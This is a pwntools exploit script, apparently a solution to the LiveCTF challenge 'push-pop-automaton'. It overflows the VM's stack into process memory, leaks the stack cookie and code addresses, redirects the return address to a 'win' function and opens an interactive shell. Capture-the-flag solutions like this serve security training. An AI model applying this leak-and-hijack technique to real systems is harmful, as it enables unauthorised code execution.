import argparse

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000",
                    help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))
# r = process(
#     ['/home/ctf/LiveCTF/challenges/push-pop-automaton/challenge/src/challenge'])

# gdb.attach(r, '''libc
# b *main+263
# c''')

prog = ("o" + # ip
        "o" + # sp
        "oo" + # ???
        "oooo" + # cookie
        "oooo" + # rbp
        "oooo" + # rip
        # frames from libc_start_main
        "oooo" + # ???
        "oooo" + # main
        "uuuu" + # junk
        "uuuu" + # junk
        # frames in main
        "uuuu" + # new rip
        "h")

# fill prog to length causes sp to start at the end
# then our pushes/pops will use stack memory after the vm memory
prog = prog + ("h" * (0x1000 - len(prog)))

r.send(prog)
pc = u16(r.recvn(2))      ; print(f"{pc=:04x}")
sp = u16(r.recvn(2))      ; print(f"{sp=:04x}")

_ = u32(r.recvn(4))       ; print(f"{_=:08x}")
cookie = u64(r.recvn(8))  ; print(f"{cookie=:016x}")
rbp = u64(r.recvn(8))     ; print(f"{rbp=:016x}")
rip = u64(r.recvn(8))     ; print(f"{rip=:016x}")

_ = u64(r.recvn(8))       ; print(f"{_=:016x}")
main = u64(r.recvn(8))    ; print(f"{main=:016x}")

# for some reason that i am not smart enough to understand, trying to
# jump directly to win+0 causes a stack error inside system()
# but jumping to win+8 works a-ok so just do that
# someone feel free to enlighten me on the cursed reasons behind this
# win+8 - main
new_rip = main + (0x00001218 - 0x00001370)

print(f'{new_rip=:016x}')

r.send(p64(0)[::-1]) # junk
r.send(p64(0)[::-1]) # junk
r.send(p64(new_rip)[::-1])

r.interactive()
